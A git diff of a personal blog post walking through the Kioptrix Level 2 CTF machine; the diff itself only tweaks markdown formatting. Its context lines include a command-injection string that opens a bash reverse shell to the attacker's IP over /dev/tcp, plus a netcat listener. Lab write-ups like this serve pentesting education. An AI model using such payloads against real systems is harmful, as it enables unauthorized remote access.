@@ -9,7 +9,7 @@ tags: blog ctf pentesting
 finished: true
 ---
 
-## Intro
+# Intro
 Hey guys, in this post I'll try and show you how to solve Level 2 Kioptrix machine. This is a first blog and there is heavy ongoing experimentation with Jekyll markup, so expect some aesthetical errors and uneven parts or padding.
 Without further a do, let's start. 
 
@@ -111,7 +111,7 @@ From enough completed challenges and CTFs I immediately recognized a possible co
 
 An attempt to estabilish a reverse shell with netcat was made, but as it appears, our target doesn't  have it. Luckily, there was another trick up my sleeve - `; bash -i >& /dev/tcp/192.168.0.213/4444 0>&1`. This is just another way of telling a computer to connect back to you. Of course before doing this we need to ready our netcat listener. `nc -lvp 4444`
 
- <img src="img/blog/IMG_1800.JPG">		
+<img src="img/blog/IMG_1800.JPG">		
 			 
 `lvp - listen, verbose, port`
 
